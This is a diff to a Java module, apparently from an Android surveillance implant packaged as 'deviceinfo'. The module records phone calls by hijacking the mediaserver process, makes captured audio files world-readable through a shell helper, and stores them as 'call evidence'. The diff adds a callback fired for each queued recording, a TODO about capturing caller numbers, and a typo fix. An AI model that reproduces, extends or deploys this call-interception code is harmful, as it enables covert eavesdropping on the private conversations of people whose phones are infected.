@@ -40,10 +40,12 @@ import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.util.AudioEncoder;
 import com.android.deviceinfo.util.ByteArray;
+import com.android.deviceinfo.util.CallBack;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
 import com.android.deviceinfo.util.Execute;
+import com.android.deviceinfo.util.ICallBack;
 import com.android.deviceinfo.util.Instrument;
 import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
@@ -77,6 +79,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final Object sync = new Object();
 	private static BlockingQueue<String> calls;
 	private EncodingTask encodingTask;
+	private CallBack cb;
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
@@ -141,6 +144,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
+			
+			// Initialize the callback system
+			cb = new CallBack();
+			cb.register(new InternalCallBack());
 			
 			Instrument hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
 			
@@ -233,7 +240,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			// Files older than 24 hours are removed
 			if (now - epoch > 60 * 60 * 24) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(purgeAudio): removing stray binary: " + fullName + " whic is: " + (now - epoch)/3600 + " hours old");
+					Check.log(TAG + "(purgeAudio): removing stray binary: " + fullName + " which is: " + (now - epoch)/3600 + " hours old");
 				}
 				
 				// Make it read-write
@@ -348,6 +355,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "(addToEncodingList): adding \"" + s + "\" to the encoding list");
 		}
+		
+		cb.trigger(s);
 		
 		// Make it read-write in any case
 		Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + s);
@@ -953,6 +962,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			// Encode to evidence
+			// TODO add caller/callee phone number and right timestamps
 			saveCallEvidence("God from heaven", true, begin, end, encodedFile, false, remote);
 
 			// We have an end of call and it's on both channels
@@ -973,5 +983,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		// Defensive, saveCallEvidence()/closeCallEvidence() already removes the file
 		audioEncoder.removeRawFile();
+	}
+	
+	public class InternalCallBack implements ICallBack {
+		private static final String TAG = "InternalCallBack";
+		
+		public <O> void run(O o) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(run callback): " + o);
+			}
+		}
 	}
 }
